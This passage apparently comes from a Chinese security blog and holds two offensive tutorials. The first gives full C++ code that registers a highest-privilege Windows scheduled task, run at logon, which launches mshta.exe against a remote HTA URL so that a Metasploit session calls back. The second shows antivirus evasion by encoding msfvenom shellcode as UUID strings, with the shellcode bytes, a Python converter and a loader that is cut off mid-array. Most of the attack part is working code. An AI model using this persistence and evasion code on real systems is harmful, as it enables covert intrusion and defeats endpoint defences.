<p>4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</p>
<p>初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象</p>
<h2 id="2-创建计划任务"><a href="#2-创建计划任务" class="headerlink" title="2.创建计划任务"></a>2.创建计划任务</h2><p>从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置</p>
<p>设置注册信息，包括设置作者信息。</p>
<p>设置主体信息，包括登陆类型、运行权限。</p>
<p>设置配置信息，包括使用电池运行时是否停止</p>
<p>设置操作信息，包括要启动的程序，并设置程序路径和参数</p>
<p>设置触发器，在用户登陆时执行计划任务</p>
<h2 id="3-删除计划任务"><a href="#3-删除计划任务" class="headerlink" title="3.删除计划任务"></a>3.删除计划任务</h2><p>调用DeleteTask接口函数删除指定名称的计划任务</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>这里使用mshta上线，无文件上线的方法很多，不局限这一种</p>
<p>将计划任务设置为执行c:\windows\system32\mshta.exe <a target="_blank" rel="noopener" href="http://192.168.111.129:8080/p7ptgsev.hta">http://192.168.111.129:8080/p7ptgsev.hta</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;taskschd.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">ITaskService* m_lpITS = <span class="literal">NULL</span>;</span><br><span class="line">ITaskFolder* m_lpRootFolder = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//1.CoInitialize初始化COM组件</span></span><br><span class="line">	HRESULT hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;初始化COM组件失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.CoCreateInstance创建任务服务对象</span></span><br><span class="line">	hr = CoCreateInstance(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;创建任务服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//3.连接到任务服务</span></span><br><span class="line">	hr = m_lpITS-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;连接服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</span></span><br><span class="line">	hr = m_lpITS-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">&quot;\\&quot;</span>), &amp;m_lpRootFolder);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;获取指针失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnInit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_lpITS)</span><br><span class="line">	&#123;</span><br><span class="line">		m_lpITS-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (m_lpRootFolder)</span><br><span class="line">	&#123;</span><br><span class="line">		m_lpRootFolder-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	::CoUninitialize();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateTask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName,<span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath,<span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters,<span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 创建任务定义对象来创建任务</span></span><br><span class="line">	ITaskDefinition* pTaskDefinition = <span class="literal">NULL</span>;</span><br><span class="line">	HRESULT hr = m_lpITS-&gt;NewTask(<span class="number">0</span>, &amp;pTaskDefinition);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置注册信息 */</span></span><br><span class="line">	IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantAuthor</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantAuthor = lpszAuthor;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置作者信息</span></span><br><span class="line">	hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal);</span><br><span class="line">	pRegInfo-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置登录类型和运行权限 */</span></span><br><span class="line">	IPrincipal* pPrincipal = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置登录类型</span></span><br><span class="line">	hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);</span><br><span class="line">	<span class="comment">// 设置运行权限</span></span><br><span class="line">	<span class="comment">// 最高权限</span></span><br><span class="line">	hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);</span><br><span class="line">	pPrincipal-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置其他信息 */</span></span><br><span class="line">	ITaskSettings* pSettting = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置其他信息</span></span><br><span class="line">	hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE);</span><br><span class="line">	hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE);</span><br><span class="line">	hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL);</span><br><span class="line">	pSettting-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建执行动作 */</span></span><br><span class="line">	IActionCollection* pActionCollect = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 创建执行操作</span></span><br><span class="line">	hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);</span><br><span class="line">	pActionCollect-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 设置执行程序路径和参数 */</span></span><br><span class="line">	<span class="function">CComVariant <span class="title">variantProgramPath</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantParameters</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction));</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		pAction-&gt;Release();</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pAction-&gt;Release();</span><br><span class="line">	<span class="comment">// 设置程序路径和参数</span></span><br><span class="line">	variantProgramPath = lpszProgramPath;</span><br><span class="line">	variantParameters = lpszParameters;</span><br><span class="line">	pExecAction-&gt;put_Path(variantProgramPath.bstrVal);</span><br><span class="line">	pExecAction-&gt;put_Arguments(variantParameters.bstrVal);</span><br><span class="line">	pExecAction-&gt;Release();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建触发器，实现用户登陆自启动 */</span></span><br><span class="line">	ITriggerCollection* pTriggers = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建触发器,把触发器设置为</span></span><br><span class="line">	ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">	hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 注册任务计划  */</span></span><br><span class="line">	IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantTaskName = lpszTaskName;</span><br><span class="line">	hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal,</span><br><span class="line">		pTaskDefinition,</span><br><span class="line">		TASK_CREATE_OR_UPDATE,</span><br><span class="line">		<span class="keyword">_variant_t</span>(),</span><br><span class="line">		<span class="keyword">_variant_t</span>(),</span><br><span class="line">		TASK_LOGON_INTERACTIVE_TOKEN,</span><br><span class="line">		<span class="keyword">_variant_t</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">		&amp;pRegisteredTask);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		pTaskDefinition-&gt;Release();</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pTaskDefinition-&gt;Release();</span><br><span class="line">	pRegisteredTask-&gt;Release();</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">DeleteTask</span><span class="params">(<span class="keyword">char</span>* lpszTaskName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == m_lpRootFolder)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">	variantTaskName = lpszTaskName;</span><br><span class="line">	HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName = <span class="string">&quot;aaasacwss&quot;</span>;   <span class="comment">//任务名</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath = <span class="string">&quot;c:\\windows\\system32\\mshta.exe&quot;</span>;  <span class="comment">//要执行的程序路径</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters = <span class="string">&quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;</span>;     <span class="comment">//程序参数</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	Init();</span><br><span class="line">	BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Create Task Failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	UnInit();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Successd&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>运行</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b58fbe028a50001c1d1b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/96f48898-e4f9-49b8-a268-eb5857e5af25.png" alt="imgbed.cn图床"></a></p>
<p>添加成功</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b590ede602f00013761dd"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d3bed366-0653-445c-bb85-c3ca43d26f8b.png" alt="imgbed.cn图床"></a></p>
<p>使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=603b5904fac28b0001cfe814"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/914aa532-5678-4d12-b56a-46493f2b9c6d.png" alt="imgbed.cn图床"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-27T05:45:50.000Z" title="2021-02-27T05:45:50.000Z">2021-02-27</time>发表</span><span class="level-item"><time dateTime="2021-02-27T05:47:07.013Z" title="2021-02-27T05:47:07.013Z">2021-02-27</time>更新</span><span class="level-item">7 分钟读完 (大约1020个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/27/uuid%E5%85%8D%E6%9D%80/">uuid免杀</a></h1><div class="content"><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象</p>
<h2 id="将shellcode转换为uuid"><a href="#将shellcode转换为uuid" class="headerlink" title="将shellcode转换为uuid"></a>将shellcode转换为uuid</h2><p>用msf生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&quot;calc.exe&quot; -f c</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dc936cea45000128758e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d6eab119-32a6-4f11-8d66-7275a9f557ee.png" alt="imgbed.cn图床"></a></p>
<p>16个字节转换为一个uuid值，不满时用\x00填充，\x00占一个字节</p>
<p>首先用python把shellcode转换为uuid</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(bytes_le&#x3D;u)</span><br></pre></td></tr></table></figure>

<p>uuid转换为字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(&#39;1f748bef-481c-fe01-8b34-ae4801f799ff&#39;).bytes_le</span><br></pre></td></tr></table></figure>



<p>将shellcode转换为uuid，不足十六个字节的用\x00补全</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&#x27;</span></span><br><span class="line">shellcodelist=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">        shellcode+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">16</span>):</span><br><span class="line">    u=<span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>]))</span><br><span class="line">    shellcodelist.append(u)</span><br><span class="line">print(shellcodelist)</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6039dc9ab6ce210001ce90fa"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a031db93-5756-4b36-b3af-26a7daf85873.png" alt="imgbed.cn图床"></a></p>
<p>加载shellcode</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;</span>,</span><br><span class="line"><span class="string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span>,</span><br><span class="line"><span class="string">&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;</span>,</span><br><span class="line"><span class="string">&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;</span>,</span><br><span class="line"><span class="string">&quot;48514152-528b-8b20-423c-4801d08b8088&quot;</span>,</span><br><span class="line"><span class="string">&quot;48000000-c085-6774-4801-d0508b481844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;</span>,</span><br><span class="line"><span class="string">&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;</span>,</span><br><span class="line"><span class="string">&quot;f175e038-034c-244c-0845-39d175d85844&quot;</span>,</span><br><span class="line"><span class="string">&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;</span>,</span><br><span class="line"><span class="string">&quot;8b41d001-8804-0148-d041-5841585e595a&quot;</span>,</span><br><span class="line"><span 